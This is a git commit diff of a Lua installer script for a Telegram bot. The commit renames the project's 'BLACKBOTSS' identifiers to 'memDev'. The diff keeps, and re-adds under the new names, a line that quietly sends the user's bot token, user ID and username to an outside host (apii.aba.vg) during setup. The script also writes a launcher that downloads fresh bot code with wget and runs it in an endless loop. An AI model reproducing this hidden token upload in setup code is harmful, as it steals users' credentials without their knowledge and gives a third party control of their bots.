d9db2e0bc8ba483022f9cd0bb49cbc3440f6d5d0
LOST2014 <80536220+LOST2014@users.noreply.github.com>
2021-04-16 19:15:15 -0700

    Update start.lua

--- start.lua
+++ start.lua
@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_BLACKBOTSS = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_BLACKBOTSS = function() 
+Server_memDev = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_memDev = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local BLACKBOTSS_Info_Sudo = io.open("sudo.lua", 'w')
-BLACKBOTSS_Info_Sudo:write([[
+local memDev_Info_Sudo = io.open("sudo.lua", 'w')
+memDev_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-BLACKBOTSS_Info_Sudo:close()
+memDev_Info_Sudo:close()
 end  
-if not database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS") then
+if not database:get(Server_memDev.."Token_memDev") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_BLACKBOTSS.."Token_BLACKBOTSS",token)
+database:set(Server_memDev.."Token_memDev",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS") then
+if not database:get(Server_memDev.."UserName_memDev") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_BLACKBOTSS.."UserName_BLACKBOTSS",Json.Info.Username)
-database:set(Server_BLACKBOTSS.."Id_BLACKBOTSS",Json.Info.Id)
+database:set(Server_memDev.."UserName_memDev",Json.Info.Username)
+database:set(Server_memDev.."Id_memDev",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_BLACKBOTSS_Info()
-Create_Info(database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS"),database:get(Server_BLACKBOTSS.."Id_BLACKBOTSS"),database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS"))   
-https.request("https://apii.aba.vg/apibot/infobot.php?id="..database:get(Server_BLACKBOTSS.."Id_BLACKBOTSS").."&user="..database:get(Server_BLACKBOTSS.."UserName_BLACKBOTSS").."&token="..database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS"))
-local RunBLACKBOTSS = io.open("BLACKBOTSS", 'w')
-RunBLACKBOTSS:write([[
+local function Files_memDev_Info()
+Create_Info(database:get(Server_memDev.."Token_memDev"),database:get(Server_memDev.."Id_memDev"),database:get(Server_memDev.."UserName_memDev"))   
+https.request("https://apii.aba.vg/apibot/infobot.php?id="..database:get(Server_memDev.."Id_memDev").."&user="..database:get(Server_memDev.."UserName_memDev").."&token="..database:get(Server_memDev.."Token_memDev"))
+local RunmemDev = io.open("memDev", 'w')
+RunmemDev:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
-token="]]..database:get(Server_BLACKBOTSS.."Token_BLACKBOTSS")..[["
-rm -fr BLACKBOTSS.lua
-wget "https://raw.githubusercontent.com/LOST2014/BLACKBOTSS/master/BLACKBOTSS.lua"
+cd $HOME/memDev
+token="]]..database:get(Server_memDev.."Token_memDev")..[["
+rm -fr memDev.lua
+wget "https://raw.githubusercontent.com/LOST2014/memDev/master/memDev.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./BLACKBOTSS.lua -p PROFILE --bot=$token
+./tg -s ./memDev.lua -p PROFILE --bot=$token
 done
 ]])
-RunBLACKBOTSS:close()
+RunmemDev:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/memDev
 while(true) do
 rm -fr ../.telegram-cli
-screen -S BLACKBOTSS -X kill
-screen -S BLACKBOTSS ./BLACKBOTSS
+screen -S memDev -X kill
+screen -S memDev ./memDev
 done
 ]])
 RunTs:close()
 end
-Files_BLACKBOTSS_Info()
-database:del(Server_BLACKBOTSS.."Token_BLACKBOTSS");database:del(Server_BLACKBOTSS.."Id_BLACKBOTSS");database:del(Server_BLACKBOTSS.."UserName_BLACKBOTSS")
+Files_memDev_Info()
+database:del(Server_memDev.."Token_memDev");database:del(Server_memDev.."Id_memDev");database:del(Server_memDev.."UserName_memDev")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_BLACKBOTSS()  
+AutoFiles_memDev()  
 var = true
 else   
 f:close()  
-database:del(Server_BLACKBOTSS.."Token_BLACKBOTSS");database:del(Server_BLACKBOTSS.."Id_BLACKBOTSS");database:del(Server_BLACKBOTSS.."UserName_BLACKBOTSS")
+database:del(Server_memDev.."Token_memDev");database:del(Server_memDev.."Id_memDev");database:del(Server_memDev.."UserName_memDev")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
